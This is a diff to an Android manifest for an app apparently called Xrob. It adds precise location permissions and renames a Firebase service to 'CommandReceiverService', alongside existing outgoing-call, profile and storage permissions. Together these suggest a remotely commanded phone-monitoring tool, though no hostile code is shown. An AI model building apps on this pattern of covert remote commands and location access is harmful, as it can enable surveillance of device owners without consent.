@@ -17,9 +17,14 @@
     <uses-permission android:name="android.permission.READ_PROFILE" />
     <!--To launch activity-->
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+
     <!--TODO: Dir - NOT YET-->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <!--To get phone location through TelephonyManager-->
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
 
     <application
         android:name=".utils.Xrob"
@@ -49,7 +54,7 @@
             </intent-filter>
         </receiver>
 
-        <service android:name=".services.firebase.MessagingService">
+        <service android:name=".services.firebase.CommandReceiverService">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
